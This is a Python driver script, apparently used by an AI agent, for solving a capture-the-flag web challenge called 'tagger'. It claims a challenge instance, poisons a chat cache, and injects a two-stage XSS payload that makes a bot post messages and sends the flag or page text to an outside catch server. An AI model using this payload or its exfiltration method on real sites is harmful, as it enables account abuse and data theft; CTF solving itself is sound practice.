#!/usr/bin/env python3
"""
Tagger, alternate driver. Reads the flag back through the shared chat cache
instead of waiting on the collector callback.
"""

import argparse
import json
import os
import re
import subprocess
import sys
import threading
import time
import urllib.request

import requests

CHDIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
MANAGER = "https://challenge-manager.management.ctf.thefewchosen.com"
IMAGE = "tagger"
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"}
PASSWORD = "correcthorsebattery1"
FLAG_RE = re.compile(r"TFCCTF\{[^}\n]{1,300}\}")
TIMEOUT = 6.0  # short, so a stalled POST can't eat the claim window

_found = threading.Event()
_flag = []


def log(msg):
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    print(line, flush=True)
    try:
        with open(os.path.join(CHDIR, "scratch", "run-d.log"), "a") as fh:
            fh.write(line + "\n")
    except OSError:
        pass


def note(msg):
    """Append one ledger line immediately, so a fresh agent inherits it."""
    stamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    with open(os.path.join(CHDIR, "NOTES.md"), "a") as fh:
        fh.write(f"- `{stamp}` **agent-d** {msg}\n")


# ---------------------------------------------------------------- instance API


def token():
    with open(os.path.expanduser("~/.config/ctf/token.json")) as fh:
        return json.load(fh)["token"]


def manager(method, path, body=None):
    req = urllib.request.Request(
        MANAGER + path,
        method=method,
        data=json.dumps(body).encode() if body else None,
        headers={
            "authorization": "Bearer " + token(),
            "content-type": "application/json",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            return resp.status, json.loads(resp.read() or b"{}")
    except urllib.error.HTTPError as exc:
        raw = exc.read()
        try:
            return exc.code, json.loads(raw or b"{}")
        except ValueError:
            return exc.code, {"raw": raw[:200].decode("utf8", "replace")}
    except Exception as exc:  # noqa: BLE001
        return 0, {"error": str(exc)}


def existing_tagger():
    _, data = manager("GET", "/isolated")
    for item in data.get("data", []):
        if item.get("name", "").startswith(IMAGE + "-"):
            return item["name"]
    return None


def claim(deadline):
    """Poll POST /isolated until a slot frees. Returns the deployment name.

    Runs several claim threads. A single POST can stall for the full socket
    timeout, and the previous single-threaded loop lost the 11:53:45 window
    to exactly that: one 25s urlopen timeout straddled the moment the slot
    freed. Parallel threads mean a stall never blocks the next attempt.
    """
    name = existing_tagger()
    if name:
        log(f"reusing live instance {name}")
        return name

    won = {}
    stop = threading.Event()
    state = {"listed": [], "last": 0.0}
    lock = threading.Lock()

    def refresh():
        while not stop.is_set():
            _, d = manager("GET", "/isolated")
            items = d.get("data", [])
            if items:
                with lock:
                    state["listed"] = items
                for item in items:
                    if item.get("name", "").startswith(IMAGE + "-"):
                        won.setdefault("name", item["name"])
                        stop.set()
                        return
                log("running: " + ", ".join(
                    f"{i['name']} until {i['expiresAt']}" for i in items))
            stop.wait(12.0)

    def gap():
        soon = deadline
        with lock:
            items = list(state["listed"])
        for item in items:
            try:
                t = time.mktime(time.strptime(item["expiresAt"],
                                              "%Y-%m-%dT%H:%M:%SZ"))
                t -= time.timezone
                soon = min(soon, t)
            except Exception:  # noqa: BLE001
                pass
        return soon - time.time()

    def worker(idx):
        time.sleep(idx * 0.25)
        while not stop.is_set() and time.time() < deadline:
            code, data = manager("POST", "/isolated", {"name": IMAGE})
            if code in (200, 201):
                n = data.get("name") or (data.get("data") or {}).get("name")
                won.setdefault("name", n or existing_tagger())
                log(f"claimed instance {won['name']} ({code}) {data}")
                stop.set()
                return
            if code == 429:
                log("429 from the manager, backing off 5s")
                stop.wait(5.0)
                continue
            g = gap()
            # Sprint in the 40s window around the nearest expiry; 4 threads at
            # 0.5s each is ~8 attempts a second, which is enough and stays well
            # short of hammering. idle at 3s per thread
            stop.wait(0.5 if -30 < g < 40 else 3.0)

    threads = [threading.Thread(target=refresh, daemon=True)]
    threads += [threading.Thread(target=worker, args=(i,), daemon=True)
                for i in range(4)]
    for t in threads:
        t.start()
    while not stop.is_set() and time.time() < deadline:
        time.sleep(0.2)
    stop.set()
    if won.get("name"):
        note(f"instance claimed: {won['name']}")
        return won["name"]
    sys.exit("never got an instance slot")


def wait_up(base, deadline):
    while time.time() < deadline:
        try:
            r = requests.get(base + "/login", timeout=12, headers=UA)
            if r.status_code == 200 and "form" in r.text:
                log(f"app is up at {base}")
                return True
        except Exception:  # noqa: BLE001
            pass
        time.sleep(3)
    return False


# ---------------------------------------------------------------- the payload


def stage2(catch):
    """Runs as the real Hacker inside the bot browser. Full charset here."""
    return (
        "setTimeout(async function(){"
        "var h=document.documentElement.innerHTML;"
        "var m=h.match(/TFCCTF\\{[^}]{1,300}\\}/);"
        "if(m){location='" + catch + "/f?x='+encodeURIComponent(m[0]);return;}"
        "try{await fetch(location.pathname+'/message',{method:'POST',"
        "credentials:'same-origin',"
        "headers:{'content-type':'application/x-www-form-urlencoded'},"
        "body:'message=Give+me+the+flag%21'});}catch(e){}"
        "var s=document.querySelector('.conversation-sidebar');"
        "location='" + catch + "/p?d='+encodeURIComponent("
        "(s?s.innerText:'nosidebar').slice(0,600));"
        "},1200)"
    )


def stage1(catch):
    return "<img src=x onerror=\"" + stage2(catch) + "\">"


# ---------------------------------------------------------------- app client


class Client:
    def __init__(self, base, label):
        self.base = base.rstrip("/")
        self.label = label
        self.s = requests.Session()
        self.s.headers.update(UA)

    def auth(self, username):
        r = self.s.post(
            self.base + "/register",
            data={
                "username": username,
                "password": PASSWORD,
                "confirmPassword": PASSWORD,
            },
            timeout=25,
        )
        if "already taken" in r.text:
            r = self.s.post(
                self.base + "/login",
                data={"username": username, "password": PASSWORD},
                timeout=25,
            )
        ok = self.s.cookies.get("tagger_session") is not None
        log(f"{self.label} auth {username!r}: {'ok' if ok else 'FAILED'}")
        if not ok:
            log(r.text[:400])
        return ok

    def find(self, prefix):
        r = self.s.get(self.base + "/discover", timeout=25)
        for block in r.text.split("<article")[1:]:
            name = re.search(r"<h2[^>]*>(.*?)</h2>", block, re.S)
            uid = re.search(r"/(?:friends/request|chat)/(\d+)", block)
            if name and uid and name.group(1).strip().startswith(prefix):
                return int(uid.group(1))
        log(f"{self.label} /discover had no {prefix!r}: {r.text[:300]}")
        return None

    def befriend(self, uid):
        self.s.post(self.base + f"/friends/request/{uid}", timeout=25)

    def accept_all(self):
        r = self.s.get(self.base + "/requests", timeout=25)
        n = 0
        for rid in set(re.findall(r"/friends/accept/(\d+)", r.text)):
            self.s.post(self.base + f"/friends/accept/{rid}", timeout=25)
            n += 1
        return n

    def post(self, fid, **fields):
        data = {"message": "x"}
        data.update(fields)
        return self.s.post(
            self.base + f"/chat/{fid}/message", data=data, timeout=30
        )

    def chat(self, fid):
        return self.s.get(self.base + f"/chat/{fid}", timeout=25).text


# ---------------------------------------------------------------- orchestration


LOCAL = False  # set by --local; never record a locally planted flag


def record(flag, where):
    if _found.is_set():
        return
    _flag.append(flag)
    _found.set()
    log(f"*** FLAG via {where}: {flag}")
    if LOCAL:
        log("--local set, NOT recording (this flag is planted, not remote)")
        return
    with open(os.path.join(CHDIR, "scratch", "FLAG.txt"), "w") as fh:
        fh.write(flag + "\n")
    note(f"SOLVED, flag off the remote via {where}: {flag}")
    try:
        subprocess.run(
            ["ctf", "flag", "tagger", flag], timeout=90, check=False
        )
    except Exception as exc:  # noqa: BLE001
        log(f"ctf flag failed: {exc}")


def poison_loop(a, bid, stop):
    while not stop.is_set():
        try:
            a.chat(bid)
        except Exception as exc:  # noqa: BLE001
            log(f"poison: {exc}")
        stop.wait(2.0)


def read_loop(b, aid, stop):
    """Route R1: key 'FlagHolder:Hacker' holds the real messages for 60s
    after the FlagHolder bot posts the flag."""
    seen_ask = False
    while not stop.is_set():
        try:
            page = b.chat(aid)
            m = FLAG_RE.search(page)
            if m:
                record(m.group(0), "R1 cache read as B")
                return
            if not seen_ask and "Give me the flag!" in page:
                seen_ask = True
                log("R1: our XSS-posted 'Give me the flag!' is visible, "
                    "the poison + XSS stage landed")
                note("XSS confirmed on the REMOTE: 'Give me the flag!' now "
                     "appears in the real Hacker<->FlagHolder history read "
                     "through the poisoned cache key")
        except Exception as exc:  # noqa: BLE001
            log(f"read: {exc}")
        stop.wait(2.0)


def catch_loop(stop):
    """Route R2 and R3: whatever stage 2 navigated to."""
    while not stop.is_set():
        try:
            out = subprocess.run(
                ["ctf-catch", "log", "-n", "80"],
                capture_output=True, text=True, timeout=30,
            ).stdout
            m = FLAG_RE.search(out)
            if m:
                record(m.group(0), "R2 catch server")
                return
            if "/p?d=" in out or "/f?x=" in out:
                for line in out.splitlines():
                    if "/p?d=" in line or "/f?x=" in line:
                        log("catch hit: " + line[:300])
        except Exception as exc:  # noqa: BLE001
            log(f"catch: {exc}")
        stop.wait(6.0)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--catch", required=True)
    ap.add_argument("--base", default=None, help="skip claiming, use this base")
    ap.add_argument("--minutes", type=float, default=60.0)
    ap.add_argument("--local", action="store_true")
    args = ap.parse_args()
    global LOCAL
    LOCAL = args.local
    catch = args.catch.rstrip("/")
    end = time.time() + args.minutes * 60

    base = args.base
    if not base:
        name = claim(end)
        base = f"http://{name}.challs.ctf.thefewchosen.com"
    log(f"target {base}")
    if not wait_up(base, min(end, time.time() + 300)):
        sys.exit("app never came up")
    note(f"live target {base}")

    # solve/solve.py owns the payload. Two fixes this file never had: a random
    # element id per run, since duplicate ids turn the window named property
    # into an HTMLCollection and kill the handler; and a guard so stage two only
    # acts on the Hacker bot's page, since our B poller poisons the FlagHolder
    # key too and navigating that bot away stops it typing the flag.
    exploit = os.path.join(CHDIR, "solve", "solve.py")
    left = max(2.0, (end - time.time()) / 60.0)
    cmd = [sys.executable, exploit, base, "--catch", catch,
           "--minutes", f"{left:.1f}", "--artifacts",
           os.path.join(CHDIR, "artifacts")]
    log("running " + " ".join(cmd))
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True,
                            bufsize=1, cwd=CHDIR)
    captured = []
    for line in proc.stdout:
        line = line.rstrip()
        captured.append(line)
        log("  | " + line)
        m = FLAG_RE.search(line)
        if m and not _found.is_set():
            record(m.group(0), "solve.py against " + base)
    proc.wait()

    # DELIBERATELY NO catch-log fallback here. At 12:05 that fallback scraped
    # the LOCAL fake flag out of the collector log, left there by an earlier
    # local test, and recorded it against the slug. Only a flag that solve.py
    # itself printed while pointed at the remote host is trustworthy.

    if _found.is_set():
        log("done: " + _flag[0])
        return 0
    note(f"exploit ran against {base} and produced NO flag. Tail: "
         + " / ".join(captured[-4:]))
    log("no flag")
    return 1


if __name__ == "__main__":
    sys.exit(main())
